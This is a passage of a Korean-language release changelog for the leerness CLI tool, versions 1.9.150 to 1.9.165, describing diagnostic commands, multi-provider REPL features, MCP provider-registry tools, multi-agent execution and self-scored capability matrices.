| (1) 웹 자동화 | 5% ❌ | **50% ⚠** (bridge MVP, playwright 미설치) → **90% ✓** (사용자 설치 시) |
| **종합** | 58% (beta-ready) | **67%** (beta-ready, production-ready 임박) |

`leerness health` 가 실시간 detect — `require('playwright')` try 성공 시 90% 자동 부여.

### Verified
- e2e 217/217 ✓
- stress-v110: 20/20 (bridge 함수 6종 + CLI 동작 6종 + 매트릭스 갱신 2종 + 누적 회귀 6종)
- VERSION = 1.9.165 / autonomous-rounds = 95

---

## 1.9.164 — 2026-05-20

**`leerness which` 진단 명령 + REPL provider 전환 UX 강화 (사용자 명시 2종).**

자율 모드 94 라운드.

### Added — `leerness which` (사용자 명시: 구버전 충돌 해결)
사용자가 "최신 버전 작동 안 함" 의심 시 한 번에 진단:
- **현재 실행 경로** — `__filename` 그대로 표시 (어떤 leerness 가 실행되는지 정확히)
- **버전 / Node / Platform**
- **`npm root -g`** — 글로벌 설치 경로
- **`npm cache`** — npx 캐싱 디렉토리
- **글로벌 설치 버전** — `npm ls -g leerness`
- **PATH 후보** — `where`/`which -a` 결과 (Windows/Unix 자동)
- **자동 진단** — 글로벌 ≠ 현재 실행 시 ⚠ 경고 + 강제 최신 명령 3종
  - `npx --yes leerness@latest <command>`
  - `npm i -g leerness@latest`
  - `npm cache clean --force`
- `--json` 옵션 — 구조화 출력

### Added — REPL UX: Ollama 실패 시 다른 CLI 즉시 전환 안내 (사용자 명시)
- **시작 시**: Ollama 미가동 + 활성 외부 CLI 발견 → 즉시 번호 선택 prompt 추가
  - `1) claude  2) codex  ...` 형태로 즉시 전환 가능
  - Enter 누르면 Ollama fallback (기존 동작 유지)
- **메시지 호출 실패 시**: `:provider claude / :provider codex` 즉시 가이드 1줄 추가
- 사용자 명시 "모델은 codex cli 같은 에이전트로 간편하게 전환 가능" 해결

### Diagnostic 실제 사용 예시
```
# leerness which (1.9.164)
현재 실행: /usr/local/lib/node_modules/leerness/bin/harness.js
버전:      v1.9.164
Node:      v24.11.1 (linux/x64)

## npm 환경
  글로벌 설치: leerness@1.9.139    ← 옛 버전!

## ⚠ 진단
  ⚠ 글로벌 설치 1.9.139 ≠ 현재 실행 1.9.164 — npx 캐시 또는 PATH 충돌 의심
    → 강제 최신: npm i -g leerness@latest  /  또는 npx --yes leerness@latest <command>
```

### Verified
- e2e 217/217 ✓
- stress-v109: 16/16 (which 6종 + REPL UX 3종 + 누적 회귀 7종)
- VERSION = 1.9.164 / autonomous-rounds = 94

---

## 1.9.163 — 2026-05-20

**`leerness health` 에 5능력 매트릭스 자동 평가 통합.**

자율 모드 93 라운드. 1.9.155 sub-agent 점검 (수동) → **코드 기반 자동 평가**로 진화. 사용자가 매 health 호출 시 leerness 자기 평가 즉시 확인.

### Added — `health` 출력 + `health --json` 의 `capabilityMatrix` 필드
5능력 자동 측정 (코드 grep 기반):

| 능력 | 측정 방법 | 현재 점수 |
|---|---|---|
| (1) 웹 자동화 | playwright/puppeteer/chromium import 검출 | **5%** (실 코드 미구현) |
| (2) PC 조작 | robotjs/nut-tree import 검출 | **5%** (필드만 있음) |
| (3) 멀티 에이전트 오케스트레이션 | `--execute` + `multi-signal consensus` 코드 | **90%** (1.9.156+1.9.155) |
| (4) REPL multi-provider | `_agentRepl` + `_cliChat` 검출 | **90%** (5종 provider) |
| (5) MCP 도구 | `leerness_*` count ≥ 50 | **100%** (51 도구) |

**종합 58% (beta-ready)** — 사용자가 leerness 의 현재 위치를 단일 명령으로 확인.

### Assessment 라벨
- `production-ready` — 종합 ≥ 70%
- `beta-ready` — 종합 ≥ 50%
- `mvp` — 종합 < 50%

### Use Cases
- 사용자가 `leerness health` 한 번으로 5능력 현황 즉시 파악
- 외부 AI 가 `leerness_health` MCP 호출 시 `capabilityMatrix.summary` 받음 (자기-점검)
- 다음 라운드 우선순위 결정 — 가장 낮은 점수 능력부터 보강 (현재: 웹 자동화 / PC 조작)
- 1.9.155 sub-agent 점검 (110초 소요) → 1.9.163 자동 (수십 ms) — 4000x 빠름

### Headline 진화 (1.9.162) + Health 진화 (1.9.163) 시너지
- 매 세션: handoff 헤드라인 `🪄 slash 24h` 로 활용도 확인
- 정기 점검: `leerness health` 로 5능력 매트릭스 자동 평가
- 사용자 결정: 점수가 낮은 영역 → 다음 라운드 후보 자동 도출

### Verified
- e2e 217/217 ✓
- stress-v108: 14/14 (capabilityMatrix 7종 + 누적 회귀 7종)
- VERSION = 1.9.163 / autonomous-rounds = 93

---

## 1.9.162 — 2026-05-20

**handoff 헤드라인 9번째 요소 — REPL slash 사용량 (24h) 노출.**

자율 모드 92 라운드. 1.9.149 observability `runs/*.jsonl` 의 실용화 — REPL 활용도 가시화.

### Added — 헤드라인 `🪄 slash 24h N회`
- 1.9.150/161 REPL slash 명령 8종 (`:verify` `:audit` `:handoff` `:health` `:lessons` `:brainstorm` `:tasks` `:plan`) 호출 빈도
- `.harness/runs/*.jsonl` 에서 `kind: 'agent_repl_slash'` + 24h 이내 entry 카운트
- 최근 200 파일만 스캔 (성능 보호)
- 슬래시 호출 없으면 노출 안 함 (노이즈 최소화)

### Headline 진화
| 요소 | 도입 |
|---|---|
| drift level | 1.9.81 |
| 🔒 보안 | 1.9.81 |
| 🔌 MCP N회 | 1.9.81 |
| 📒 skill query | 1.9.81 |
| 📚 N skills | 1.9.81 |
| ⚕ health | 1.9.93 |
| 🧠 mem T/D/R/P/L | 1.9.113 |
| 🤖 agents N | 1.9.152 |
| **🪄 slash 24h** | **1.9.162** |

### Use Cases
- 메인 에이전트가 매 세션 시작 시 "어제 REPL을 N회 사용했군 → 메모리 누적 신호" 즉시 인지
- 사용자가 leerness 도입 효과 추이 가시화
- observability lite (1.9.149) 의 첫 실용 application

### Verified
- e2e 217/217 ✓
- stress-v107: 13/13 (헤드라인 9번째 6종 + 누적 회귀 7종)
- VERSION = 1.9.162 / autonomous-rounds = 92

---

## 1.9.161 — 2026-05-20

**REPL Memory Slash 4종 추가 — Memory Surface 즉시 조회 (1.9.150 slash 패턴 확장).**

자율 모드 91 라운드. REPL 안에서 leerness 메모리 (lessons / brainstorm / tasks / plan) 즉시 조회 가능 → 대화 중 컨텍스트 회수 마찰 0.

### Added — REPL `:lessons` / `:brainstorm` / `:tasks` / `:plan`
- `:lessons [query]` — `leerness lessons --query <q>` 또는 인자 없이 전체 회수
- `:brainstorm <topic>` — `leerness brainstorm "topic"` (키워드 필수, 누락 시 안내)
- `:tasks` — `leerness task list` (현재 task 상태)
- `:plan` — `leerness plan show` (현재 milestone)

### 동작 방식
- 1.9.150 slash 패턴 재사용 — `runCommandSafe` 경유 (sandbox 자동 적용)
- `_recordRun` observability — `kind: 'agent_repl_slash'` 자동 기록
- 출력 30줄로 제한 (REPL 화면 보호)
- 60초 timeout

### REPL Slash 명령 카탈로그 갱신
| 1.9.150 (검수) | 1.9.161 (메모리) |
|---|---|
| `:verify` | `:lessons` |
| `:audit` | `:brainstorm` |
| `:handoff` | `:tasks` |
| `:health` | `:plan` |

### Use Cases
- 메인 에이전트가 새 task 시작 전 `:lessons "auth"` 로 과거 실수 회수
- `:brainstorm "deployment"` 로 관련 task-log / decisions / lessons 통합 검색
- `:tasks` 로 진행 중 task 즉시 확인 후 :provider claude 로 sub-agent 분배
- `:plan` 으로 현재 milestone 진행률 확인

### Verified
- e2e 217/217 ✓
- stress-v106: 13/13 (handleMeta 분기 4종 + REPL 시작 배너/help 안내 2종 + 누적 회귀 7종)
- VERSION = 1.9.161 / autonomous-rounds = 91

---

## 1.9.160 — 2026-05-20

**🎉 자율 모드 90 라운드 마일스톤 + `provider sync` (외부 catalog 자동 동기화).**

### Added — `leerness provider sync <url>` (1.9.157 Provider Registry 확장)
- 외부 URL 에서 provider catalog 자동 가져오기 — OpenRouter llms.txt / GitHub raw JSON / 자체 호스트
- **의존성 0 유지** — Node built-in `https.get` 사용
- 2가지 형식 자동 인식:
  1. **JSON array** — `[{ id, bin, envFlag?, desc?, ... }, ...]` 또는 `{ providers: [...] }`
  2. **llms.txt** — 한 줄당 `"id|bin|desc"` (`#` 주석 무시)
- `--dry-run` — 파일 쓰기 스킵하고 결과만 미리보기
- 보안:
  - `LEERNESS_OFFLINE=1` 시 거부
  - http:// 또는 https:// 강제
  - response 1MB 제한
  - timeout 15s
  - 3xx redirect 자동 follow (1단계)
  - id 정규식 검증 (영문자/숫자/_- 만 — sync 도 add 와 동일)
- 같은 id 두 번 → 갱신 (덮어쓰기) / 잘못된 id → skip

### Use Case — OpenRouter / Bedrock 일괄 흡수
```bash
# 가상의 leerness-providers catalog
leerness provider sync https://raw.githubusercontent.com/example/leerness-providers/main/openrouter.json

# 또는 llms.txt 형식
leerness provider sync https://example.com/providers.txt --dry-run
```

### Verified — 🎉 90 라운드 마일스톤 보고서
- `_reports/1.9.160-90-rounds-milestone.md` (비공개)
- 1.9.140 ~ 1.9.160 — 21 라운드 진화 타임라인 (사용자 명시 11 / 자율 후속 10)
- MCP 도구 진화: 8 → 30 🎉 → 40 🎉 → 47 → 48 → **50 🎉**
- **21 라운드 연속 `main` 자동 sync** 안정성
- 5능력 매트릭스 갱신: 55% → **65%**

### Pending — 다음 10 라운드 전망 (1.9.161 ~ 1.9.170)
1. LSP 어댑터 MVP (TypeScript) — 5능력 #2
2. playwright/computer-use bridge — 5능력 #4
3. i18n + 영어 docs 토글
4. REPL slash 추가 (`:lessons`, `:brainstorm`)

### Verified
- e2e 217/217 ✓
- stress-v105: 20/20 (provider sync 10종 + 마일스톤 보고서 3종 + 누적 회귀 7종) 🎉 **90 라운드 마일스톤**
- VERSION = 1.9.160 / autonomous-rounds = 90

---

## 1.9.159 — 2026-05-20

**🎉 MCP 50 도구 마일스톤 — Provider Registry CRUD MCP 완성 (list/add/remove).**

자율 모드 89 라운드. 1.9.158 (list) 의 자연스러운 후속 — add/remove 까지 MCP 로 노출 → 외부 AI 가 자가 확장 가능.

### Added — MCP `leerness_provider_add` (49번째 도구)
- 외부 AI 가 새 provider 동적 등록 — OpenRouter / Bedrock / Groq / Hugging Face 등
- 인자: `{ id (required), bin?, envFlag?, versionArgs?, desc?, installHint?, path? }`
- 같은 id 두 번 → 갱신 / 빌트인 id → user override
- id 정규식 검증 (영문자/숫자/_- 만)

### Added — MCP `leerness_provider_remove` (50번째 도구) 🎉
- 사용자 정의 provider 만 제거 (빌트인 5종 → 거부)
- 인자: `{ id (required), path? }`

### Provider Registry CRUD MCP 완성
| 작업 | CLI | MCP | 마일스톤 |
|---|---|---|---|
| Read | `leerness provider list` | `leerness_provider_list` | 1.9.158 (48번째) |
| Write | `leerness provider add` | `leerness_provider_add` | 1.9.159 (49번째) |
| Delete | `leerness provider remove` | `leerness_provider_remove` | 1.9.159 (50번째) 🎉 |

### Use Cases — 외부 AI 자가 확장
```javascript
// 메인 에이전트가 OpenRouter 발견 시 자가 등록
await mcp.callTool('leerness_provider_add', {
  id: 'openrouter', bin: 'openrouter-cli',
  desc: 'OpenRouter 200+ models aggregator'
});

// 잘못 등록한 provider 자가 정리
await mcp.callTool('leerness_provider_remove', { id: 'broken-provider' });
```

### MCP 도구 카운트 진화
- 1.9.43: 8 → 1.9.110: **30** 🎉 → 1.9.128: **40** 🎉 → 1.9.145: 47 → 1.9.158: 48 → **1.9.159: 50** 🎉

### Verified
- e2e 217/217 ✓
- stress-v104: 16/16 (MCP tools/list 50개 3종 + provider_add 3종 + provider_remove 3종 + 누적 회귀 7종) 🎉 **MCP 50 도구 마일스톤**
- VERSION = 1.9.159 / autonomous-rounds = 89

---

## 1.9.158 — 2026-05-20

**🎉 MCP 48번째 도구 `leerness_provider_list` — Provider Registry 외부 AI 노출 마일스톤.**

자율 모드 88 라운드. 1.9.157 Provider Registry CLI 의 자연스러운 후속 — MCP 노출.

### Added — MCP `leerness_provider_list` (48번째 도구)
- 외부 AI (Claude / Codex / Gemini 등) 가 MCP 통해 등록된 provider 전체 회수 가능
- 응답 JSON: `{ total, builtin, user, providers: [{ id, bin, envFlag, source, desc }] }`
- 빌트인 5종 (claude/codex/gemini/copilot/ollama) + `.harness/providers.json` 사용자 정의 통합
- 외부 AI 활용 사례:
  - 메인 에이전트가 sub-agent 분배 전 사용 가능한 provider 확인
  - OpenRouter/Bedrock 등 등록되어 있으면 자동 발견
  - sub-agent 가 "내가 사용 가능한 도구가 무엇인지" 자기-점검

### MCP 도구 카운트 진화
- 1.9.43 → 1.9.84 (READ 5종 완성): 17 도구
- 1.9.85 → 1.9.110 (health + Memory CRUD): 30 도구 마일스톤
- 1.9.112 → 1.9.119 (Memory READ 5종): 35 도구
- 1.9.128 (DELETE/RESTORE 5종): 40 도구 마일스톤
- 1.9.142 (Feature Graph): 45 도구
- 1.9.145 (env detect): 47 도구
- **1.9.158: 48 도구 🎉**

### Pending — 1.9.158 권고 다음 후보
- **1.9.159** — `leerness_provider_add` MCP 도구 (49번째) — 외부 AI 가 자가 확장 가능
- **1.9.160** — `provider sync` (OpenRouter llms.txt 자동 동기화)
- **1.9.161** — LSP 어댑터 MVP

### Verified
- e2e 217/217 ✓
- stress-v103: 12/12 (MCP tools/list 48개 3종 + tools/call 실호출 2종 + 누적 회귀 7종) 🎉 **MCP 48 도구 마일스톤**
- VERSION = 1.9.158 / autonomous-rounds = 88

---

## 1.9.157 — 2026-05-20

**Provider Registry CLI MVP — 사용자 정의 provider 동적 추가 (점검 보고서 권고 #3 — Provider Registry MCP의 CLI 단계).**

자율 모드 87 라운드. 1.9.155 점검 보고서가 발견한 "모델/프로바이더 폭 5종 vs 200+" gap 보강의 첫 단계.

### Added — `leerness provider list|add|remove` 신규 명령
- 빌트인 5종 (claude/codex/gemini/copilot/ollama) + **사용자 정의 provider 동적 추가**
- `.harness/providers.json` — 사용자 정의 저장 (schemaVersion 1)
- `_allProviders(root)` — 빌트인 + 사용자 정의 merge
  - 같은 id 의 user override 적용 → 빌트인 설정 변경 가능
  - 빌트인에 없는 user-only provider 추가

### CLI
```bash
leerness provider list                       # 빌트인 + 사용자 정의 통합 표시
leerness provider list --json                # 구조화 출력 (total/builtin/user/providers)
leerness provider add openrouter --bin openrouter-cli --desc "OpenRouter aggregator"
leerness provider add bedrock --bin aws-bedrock-cli --env-flag LEERNESS_ENABLE_BEDROCK
leerness provider remove openrouter          # 사용자 정의만 제거 가능 (빌트인 거부)
```

### Changed — `agents list/check` Provider Registry 통합
- 표 출력에 `source` 컬럼 추가 (builtin / user / user(override))
- JSON 응답에 `source` 필드 추가
- 활성 없을 때 "1.9.157: 빌트인 외 CLI 추가" hint 표시
- 헤더 `(1.9.30)` 유지 — 기존 e2e regex 호환

### Use Cases
- **OpenRouter 200+ 모델 흡수**: `provider add openrouter --bin openrouter-cli` 후 `LEERNESS_ENABLE_OPENROUTER=1` 설정
- **AWS Bedrock 통합**: `provider add bedrock --bin aws-bedrock-cli`
- **Groq / Hugging Face / 자체 LLM CLI**: 모두 동일 패턴
- **자동 발견**: 1.9.158 에서 OpenRouter llms.txt 자동 동기화 예정

### Verified — 5능력 매트릭스 갱신
| 영역 | 1.9.156 | 1.9.157 |
|---|---|---|
| Provider 폭 | 5종 고정 | **무제한 (동적 등록)** |
| 종합 완성도 | 60% | **62%** |

### Pending — 보고서 권고 남은 후보
- **1.9.158** — `leerness provider sync` (OpenRouter llms.txt 자동 동기화) + MCP `leerness_provider_list` (48번째 도구)
- **1.9.159** — LSP 어댑터 MVP (TypeScript LSP)
- **1.9.160** — playwright/computer-use bridge (`permissions.browser/mouse` 실 동작)

### Verified
- e2e 217/217 ✓
- stress-v102: 19/19 (Provider Registry 함수 3종 + list 2종 + add/remove 6종 + agents 통합 2종 + 누적 회귀 6종)
- VERSION = 1.9.157 / autonomous-rounds = 87

---

## 1.9.156 — 2026-05-20

**`agents multi --execute` 실제 spawn + consensus 통합 (1.9.155 점검 보고서 발견 gap #1 보강).**

자율 모드 86 라운드. 5능력 점검 보고서가 발견한 **"agents multi가 명령 문자열만 출력 — 실제 spawn 안 함"** 문제를 직접 해결.

### Added — `leerness agents multi "<task>" --execute`
- 기존 (1.9.152): 활성 N개 에이전트에 dispatch 명령 **문자열만 출력** — 사용자가 실행
- 신규 (1.9.156): `--execute` 플래그 시 **leerness가 직접 N개 sub-agent 병렬 spawn**
  - `Promise.all` 로 `_cliChat(provider)` 동시 호출 — 진짜 N-way 분배
  - 각 호출은 1.9.150 `runCommandSafe` 경유 → cwd jail + env scrub + 자동 observability
  - `--timeout <s>` 옵션 (기본 60s) — 무한 대기 방지
- 결과 수집 후 **1.9.155 multi-signal consensus** 자동 적용:
  - `score = 0.4*tokensNorm + 0.4*overlap + 0.2*lengthFit`
  - best 1위 + others 2-4위 점수 표시 (투명성)
- `--json` 출력: `{ task, count, success, totalElapsedMs, results, best, failures }`
- `_recordRun` 통합 — kind `agents_multi_execute` + task-log 자동 기록
- 활성 0개 또는 onlyArg 매칭 0개 → 즉시 fail (실 호출 시도 X)

### Verification — 5능력 점검 매트릭스 갱신
| 영역 | 1.9.155 | 1.9.156 |
|---|---|---|
| 멀티 에이전트 오케스트레이션 | 70% (명령 출력만) | **90%** (실 spawn + consensus 합의) |
| 종합 완성도 | 55% | **60%** |

이제 leerness 가 "지시 생성기" 가 아닌 **"실 실행 오케스트레이터"** — Hermes Agent / OpenClaw 같은 도구와의 격차가 크게 줄어듦.

### Pending — 보고서 권고 다음 3 후보
1. **1.9.157** — LSP 어댑터 MVP (TypeScript LSP 먼저)
2. **1.9.158** — Provider Registry MCP 도구 (OpenRouter/Bedrock 100+ 모델 흡수)
3. **1.9.159** — playwright/computer-use bridge (`permissions.browser/mouse` 실 동작 — opt-in)

### Verified
- e2e 217/217 ✓
- stress-v101: 18/18 (--execute 7종 + CLI 동작 3종 + 누적 회귀 8종)
- VERSION = 1.9.156 / autonomous-rounds = 86

---

## 1.9.155 — 2026-05-20

**REPL UX 대폭 개선 + provider 모델 카탈로그 + orchestrate consensus 강화 + 5능력 점검 보고서 (사용자 명시).**

자율 모드 85 라운드. 사용자 명시 점검 요청 — sub-agent 2개 병렬로 비교/실측 후 정직한 보고서 산출 + 발견 gap 1건 즉시 보강.

### Added — REPL UX (사용자 명시: 선택한 CLI 모델 변경 가능)
- **`:model <name>` 모든 provider 지원** — claude/codex/gemini/copilot/ollama 모두 가능 (1.9.149 → 1.9.155)
- **`_PROVIDER_MODEL_CATALOG`** — provider 별 추천 모델 카탈로그
  - claude: `claude-opus-4-5` / `claude-sonnet-4-5` / `claude-haiku-4-5`
  - codex: `gpt-5` / `gpt-5-codex` / `o4-mini`
  - gemini: `gemini-2.5-pro` / `gemini-2.5-flash`
  - copilot: `default` (모델 선택 불가)
  - ollama: `llama3` / `qwen2.5-coder` / `gpt-oss` (실시간 조회 권장)
- **`:models`** — provider 별 분기 (ollama 실시간 / 그 외 카탈로그)
- **`:status`** — 현재 세션 상태 자세히 (provider/model/role/permissions/history/sessionId/activeCli)
- **REPL 진입 시 handoff context 자동 노출** — 매번 `:handoff` 안 해도 즉시 컨텍스트 인지
- `:help` 에 1.9.155 명령 안내 통합

### Added — orchestrate consensus 강화 (sub-agent 점검 발견 gap 보강)
- 기존: "응답 토큰 수가 가장 긴 응답 = best" 임시 휴리스틱
- 변경: **multi-signal scoring**
  - `tokensNorm` (0~1) — 정보 밀도
  - `overlap` — 다른 응답과의 단어 교집합 비율 평균 (합의도)
  - `lengthFit` — 평균 길이 z-score 기반 적정 가중 (`|z| <= 1.5` 가산)
  - `score = 0.4*tokens + 0.4*overlap + 0.2*lengthFit`
- 출력: best 1위 + others 2-4위 점수 표시 (투명성)

### Verified — 5능력 점검 보고서 (`_reports/1.9.155-capability-audit.md`)
sub-agent 2 병렬 분석 (약 110초):

**경쟁 비교 (sub-agent #1)** — OpenClaw / Hermes Agent / OpenCode WebSearch 실측:
- leerness 비교우위: 한국어+신뢰도 하네스, MCP 47도구+Memory 5종, Feature Causality Graph, 의존성 0, 자율 release
- 부족 영역: 모델/프로바이더 폭(5종 vs 200+), LSP 통합 미흡, GUI/멀티채널 부재
- 권고: LSP 어댑터, Provider Registry MCP, i18n+영어 docs

**5능력 매트릭스 (sub-agent #2 코드 실측)**:
| 영역 | 평가 | 완성도 |
|---|---|---|
| 웹 띄워 검수 | ❌ | 5% (permissions.browser=toggle만, 실 코드 0) |
| 권한 따른 PC 조작 | ❌ | 5% (mouse/keyboard/admin 필드만, 실 사용처 0) |
| 멀티 에이전트 오케스트레이션 | ⚠ → ✓ (1.9.155 보강) | 70% → 80% |
| REPL multi-provider | ✓ | 90% |
| MCP 47도구 일관성 | ✓ | 100% |

**종합 ~55% — "검수·기억·드리프트 방지 하네스" 본질은 95%, "범용 PC 자동화"는 30%**. 정직한 포지셔닝.

### Pending — 보고서가 제안한 다음 4 라운드 후보
1. 1.9.156 — `agents multi --execute` (단순 명령 출력 → 실제 spawn + consensus 통합)
2. 1.9.157 — LSP 어댑터 MVP (TypeScript LSP 먼저)
3. 1.9.158 — Provider Registry MCP 도구 (OpenRouter/Bedrock 흡수)
4. 1.9.159 — playwright/computer-use bridge (permissions.browser/mouse 실 동작 — opt-in)

### Verified
- e2e 217/217 ✓
- stress-v100: 18/18 (REPL :model 3종 + :status/UX 3종 + consensus 2종 + 점검 보고서 3종 + 누적 회귀 7종) 🎉 **100번째 stress 마일스톤**
- VERSION = 1.9.155 / autonomous-rounds = 85

---

## 1.9.154 — 2026-05-20

**agent 1-shot multi-provider + REPL `:provider` 활성 검증 (1.9.153 후속, 일관성 강화).**

자율 모드 84 라운드.

### Added — `leerness agent "<task>" --provider <p>` 1-shot multi-provider
- 기존: 1-shot 모드는 Ollama 만 호출, 다른 CLI 는 `agents dispatch` 안내만
- 변경: **claude / codex / gemini / copilot 도 직접 호출** (1.9.153 `_cliChat` 재사용)
- `_recordRun` observability — provider/model 필드 동적 (`agent_one_shot` kind)
- task-log 기록도 provider 동적 (`leerness agent (claude:claude, role=actor)` 형식)
- 실패 시 provider 별 friendly 안내 (Ollama: BASE_URL 확인 / 외부 CLI: `LEERNESS_ENABLE_<X>=1` + 설치)

### Added — REPL `:provider <p>` 전환 시 활성 사전 검증
- validProviders 화이트리스트 5종 — 알 수 없는 provider 거부
- **비활성 (`ready` 아님) provider 전환 시 즉시 거부** — 실제 호출 시 실패 방지
- `_checkAgent` 결과로 status/installed/enabled 종합 판정
- Ollama 는 `LEERNESS_OLLAMA_BASE_URL` 미설정 시 친절한 안내 (블록 아님 — fallback URL 시도)
- 전환 성공 시 `rl.setPrompt(prompt())` 으로 프롬프트 즉시 갱신

### Verified — setup-agents `_selectMany` 일관성 (회귀 방지)
- 1.9.34 이래 setup-agents 이미 `_selectMany` 사용 중 — 1.9.151 install 흐름과 일관
- stress-v99 회귀 테스트 추가 (사용자 명시 요청 일관성 보장)

### Verified
- e2e 217/217 ✓
- stress-v99: 18/18 (1-shot multi-provider 6종 + REPL :provider 검증 4종 + setup-agents 1종 + 누적 회귀 7종)
- VERSION = 1.9.154 / autonomous-rounds = 84

---

## 1.9.153 — 2026-05-20

**`.env` 직접 생성/마이그레이션 + REPL 배너 leerness 고유 문구 + multi-provider REPL (사용자 명시 3종).**

자율 모드 83 라운드.

### Added — install 흐름에서 `.env` 직접 생성/마이그레이션 (사용자 명시)
- 기존 `.env.example` 만 작성 → **이제 `.env` 도 직접 생성** (보안 = 빈 키만)
- `mergeEnvFile()` — KEY 기준 처리:
  - 기존 키 (사용자가 채운 값 포함) **절대 덮어쓰지 않음**
  - 누락된 키만 빈 값으로 추가
  - 주석/빈 줄은 substring 미포함 시만 append
- `.gitignore` 에 `.env` 자동 등록 (1.9.71/75 audit 검증과 통합)
- `.env.example` 은 계속 생성 (참조 템플릿)

### Changed — REPL 배너 leerness 고유 문구 (사용자 명시)
- 기존: `Hermes / OpenClaw / OpenCode 스타일 + Sandbox`
- 변경: `검수·기억·샌드박스 통합 자율 AI 에이전트`
- agent 사용법 (non-TTY) 헤더도 동일 — leerness 자체 정체성 강화

### Added — REPL multi-provider 세션 관리 (사용자 명시)
- 기존: Ollama 전용 채팅
- 변경: **ollama / claude / codex / gemini / copilot** 5종 세션 관리
- `_cliChat(root, provider, prompt, opts)` — 외부 CLI 호출 헬퍼
  - 각 CLI 별 비-인터랙티브 호출 인자 자동 매핑
  - `runCommandSafe` 경유 (env scrub + permissions + observability 자동)
  - 활성 (`_checkAgent` ready) 확인 후 실행 — 비활성 시 friendly 에러
- REPL 진입 시:
  - `.env` 자동 로드 (LEERNESS_ENABLE_* 즉시 반영)
  - 활성 CLI 단일 → 자동 선택 / 복수 → 사용자 번호 선택 / 0개 → Ollama fallback
- `:provider <p>` 메타 명령으로 세션 중 전환 가능
- `:role <r>` 와 조합하여 planner=claude / actor=codex 같은 multi-CLI 워크플로 가능

### Security
- `.env` 가 `.gitignore` 에 등록 (실제 시크릿 누출 방지)
- `_cliChat` 가 `runCommandSafe` 경유 → env scrub 화이트리스트만 자식 프로세스에 전파
- `.harness/runs/run-*.jsonl` 에 `kind: 'agent_repl_cli'` 로 모든 외부 CLI 호출 기록

### Verified
- e2e 217/217 ✓
- stress-v98: 23/23 (env 생성 7종 + REPL 배너 3종 + multi-provider 6종 + 누적 회귀 7종)
- VERSION = 1.9.153 / autonomous-rounds = 83

---

## 1.9.152 — 2026-05-20

**`agents multi` — 활성 N개 에이전트 일괄 dispatch + handoff 헤드라인 활성 에이전트 카운트 (1.9.151 복수 선택 후속).**

자율 모드 82 라운드. 1.9.151 install 복수 선택의 자연스러운 후속 — 실제 사용 시점에 선택된 에이전트들을 동시에 활용.

### Added — `leerness agents multi "<task>"` 신규 명령
- 활성 (ready) 에이전트들에 **일괄 dispatch 명령** 자동 생성 (claude/codex/gemini/copilot/ollama)
- `--only c1,c2` — 활성 중에서 추가 필터링
- `--write` — 파일 수정 권한 플래그 (각 CLI 별 적절한 옵션 자동 적용)
- `--json` — 구조화 출력 (`{ task, count, agents, commands }`)
- 메인 에이전트가 N개 sub-agent로 spawn 후 결과 합의/투표 → 가장 안정적인 답 선택

### Added — `agents dispatch --multi` / `--to all` alias routing
- 기존 `dispatch --to <id>` 와 동일한 인터페이스로 multi 모드 진입 가능
- `--to all` 또는 `--to *` 또는 `--multi` 플래그로 자동 routing

### Added — `_dispatchCommand(agentId, task, writeMode)` 공유 헬퍼
- single dispatch + multi dispatch 가 동일한 명령 빌더 사용 — 일관성 보장
- 5종 CLI 모두 지원 (claude/codex/gemini/copilot/ollama)

### Added — handoff 헤드라인 8번째 항목 — 활성 에이전트 카운트
- `🤖 agents N (claude,codex,...)` — 메인 에이전트가 매 세션 즉시 sub-agent 분배 가능성 인지
- 활성 0개면 표시 안 함 (노이즈 최소화)
- 1.9.151 복수 선택 결과가 .env 활성화 → 즉시 헤드라인 반영

### Verified
- e2e 217/217 ✓
- stress-v97: 18/18 (agents multi 6종 + handoff 헤드라인 3종 + help/fail-fast 2종 + 누적 회귀 7종)
- VERSION = 1.9.152 / autonomous-rounds = 82

---

## 1.9.151 — 2026-05-20

**install 흐름 — CLI 에이전트 복수 선택 + REPL 자동 시작 prompt + viewwork 제거 + help 검증 (사용자 명시 3종).**

자율 모드 81 라운드.

### Added — install: CLI 에이전트 복수 선택 (사용자 명시)
- 기존 4지 단일 선택 (`none`/`claude`/`ollama`/`all`) → **5개 후보 다중 선택**
  - Claude / Codex / Gemini / Copilot / Ollama
  - Space 토글, `a` 전체, `n` 해제, Enter 확정
- non-TTY fallback: 콤마 구분 (예: `1,5` 또는 `claude,ollama` 또는 `all` 또는 `none`)
- `.env.example` LEERNESS_ENABLE_* 플래그가 선택된 에이전트별로 정확히 활성화 (이전엔 `all` 외에는 단일만)
- 배열/문자열/'all'/'none' 모두 처리하는 `enabledSet` Set 기반 헬퍼 (back-compat)

### Added — install 종료 후 REPL 자동 시작 prompt (사용자 명시)
- 모든 문항 (언어/에이전트/권한) 끝난 후 — **에이전트가 선택된 경우만** REPL 활성화 여부 묻기
- "예" 선택 시 설치 완료 직후 1.9.149 `_agentRepl` 자동 진입 (Ollama provider / actor 역할)
- 기본값 "아니오" (안전) — 사용자가 토큰/모델 설정 후 별도로 `leerness agent` 실행

### Removed — viewwork 관련 (사용자 명시 — leerness 와 무관)
- `viewworkEmit()` / `viewworkInstall()` 함수 정의 삭제
- 라우터 분기 `cmd === 'viewwork'` 2종 제거
- `session close` 의 자동 `viewworkEmit` 콜 제거
- help 텍스트에서 `leerness viewwork install/emit` 2줄 제거
- `scripts/e2e.js` 의 `viewwork install` + `viewwork emit` 테스트 라인 제거
- 기존 프로젝트의 `.viewwork/` 디렉토리는 leerness 가 삭제하지 않음 (사용자 책임)

### Verified — help 모든 명령어 통과
- sub-agent 병렬 검증: **39/39 명령어 모두 exit 0 또는 1 (정상)** — TypeError / ReferenceError / unknown command 0건
- 검증 명령어: init / migrate / update / status / verify / debug / audit / check / scan / encoding / lazy / memory / handoff / orchestrate / deps / persona / agents / setup-agents / reuse-map / session / route / self / readme / consistency / plan / task / skill / gate / retro / insights / brainstorm / roadmap / verify-code / lessons / rule / release / health / runs / permissions / env / creds / decision / lesson / plan list / agent

### Verified
- e2e 217/217 (viewwork 2건 삭제로 219→217)
- stress-v96: 26/26 (복수선택 4종 + REPL prompt 4종 + viewwork 제거 6종 + help 5종 + 누적 회귀 7종)
- VERSION = 1.9.151 / autonomous-rounds = 81

---

## 1.9.150 — 2026-05-20

**Sandboxing — `runCommandSafe()` wrapper + REPL slash-commands (3중 LLM 합의 #3 / Codex 권고).**

자율 모드 80 라운드 마일스톤. 1.9.149 REPL 위에 **샌드박스 보안 레이어** + **leerness 내부 명령 직접 호출**을 추가.

### Added — `runCommandSafe(cmd, args, opts)` sandbox wrapper
